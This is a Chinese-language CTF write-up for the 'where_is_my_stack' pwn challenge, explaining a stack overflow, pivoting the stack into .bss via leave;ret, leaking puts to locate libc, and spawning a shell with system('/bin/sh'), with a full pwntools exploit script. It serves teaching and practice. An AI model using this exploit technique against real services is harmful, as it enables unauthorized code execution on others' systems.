# where_is_my_stack

## 题目简述

附件是无 PIE 的 amd64 ELF。`vuln` 在栈上分配 `0x20` 字节，却读取 `0x30` 字节，因此可以覆盖保存的 `rbp` 和返回地址。利用思路是把 `rbp` 指向 `.bss`，返回到跳过函数序言的 `vuln+0xc`，使后续 `read` 直接写入伪栈；随后泄露 libc 地址并执行 `system("/bin/sh")`。

## 解题过程

### 1. 栈溢出与 `leave; ret`

`vuln` 的关键反汇编为：

```asm
401205  push rbp
401209  mov  rbp, rsp
40120d  sub  rsp, 0x20
401211  lea  rdi, [提示字符串]
401218  call puts
40121d  lea  rax, [rbp-0x20]
401221  mov  edx, 0x30
401226  mov  rsi, rax
401229  mov  edi, 0
40122e  call read
401233  nop
401234  leave
401235  ret
```

`leave` 等价于：

```asm
mov rsp, rbp
pop rbp
```

因此控制保存的 `rbp` 就能控制下一次 `leave` 使用的栈位置。这里返回到 `0x401211`，刻意跳过 `push rbp; mov rbp,rsp; sub rsp,0x20`，让已经改成 `.bss` 地址的 `rbp` 保持不变，后面的 `read(0, rbp-0x20, 0x30)` 便会向伪栈写数据。

### 2. 泄露 libc 并再次迁移

第一轮在 `.bss` 建立可持续读入的布局，随后用：

```text
pop rdi; ret → puts@got → puts@plt
```

泄露 `puts` 实际地址。根据附件自带的 `libc.so.6` 计算 libc 基址、`system` 和 `/bin/sh`。再准备一次 `.bss` 伪栈，最后执行：

```text
pop rdi; ret → "/bin/sh" → ret → system
```

额外的单独 `ret` 用于满足 amd64 SysV ABI 的 16 字节栈对齐要求。

完整利用脚本如下：

```python
from pwn import ELF, context, p64, remote, u64

context(os="linux", arch="amd64")

HOST = "TARGET"
PORT = 43001
PROMPT = b"Every doll has her fixed place,but not stack ~\n"

io = remote(HOST, PORT)
elf = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

pop_rdi_ret = 0x4012C3
puts_got = 0x404018
puts_plt = 0x401070
vuln_body = 0x401211
ret = 0x401235

# 将 rbp 迁到 .bss，并返回到跳过序言的 vuln 主体。
payload1 = b"A" * 0x20 + p64(0x404700) + p64(vuln_body)
io.sendafter(PROMPT, payload1)

# 在 .bss 中布置下一次 rbp 与返回地址。
payload2 = b"B" * 0x20 + p64(0x404728) + p64(vuln_body)
io.sendafter(PROMPT, payload2)

# read 的返回地址位于可写伪栈中，本次输入直接成为 ROP 链。
payload3 = (
    p64(pop_rdi_ret)
    + p64(puts_got)
    + p64(puts_plt)
    + p64(vuln_body)
)
io.sendafter(PROMPT, payload3)

puts_address = u64(io.recvn(6).ljust(8, b"\x00"))
libc.address = puts_address - libc.sym["puts"]
system = libc.sym["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

# 重新整理 leave/read 所需的 .bss 布局。
payload4 = (
    b"C" * 0x18
    + p64(0x401233)
    + p64(0x404700)
    + p64(vuln_body)
)
io.sendafter(PROMPT, payload4)

payload5 = b"D" * 0x20 + p64(0x404728) + p64(vuln_body)
io.sendafter(PROMPT, payload5)

payload6 = (
    p64(pop_rdi_ret)
    + p64(bin_sh)
    + p64(ret)
    + p64(system)
)
io.sendafter(PROMPT, payload6)

io.interactive()
```

这里必须使用附件配套的 `libc.so.6` 计算偏移。归档没有包含远端实例的实际 flag 字符串，因此不在 WP 中猜测该值。

## 方法总结

栈迁移的核心是同时理解 `rbp`、`rsp`、`leave` 和函数序言。本题还利用了一个细节：返回到 `0x401211` 会跳过序言，使受控 `rbp` 继续作为 `read` 目标基址；伪栈布局合适时，`read` 甚至会覆盖自己的返回地址，让新输入直接成为 ROP 链。
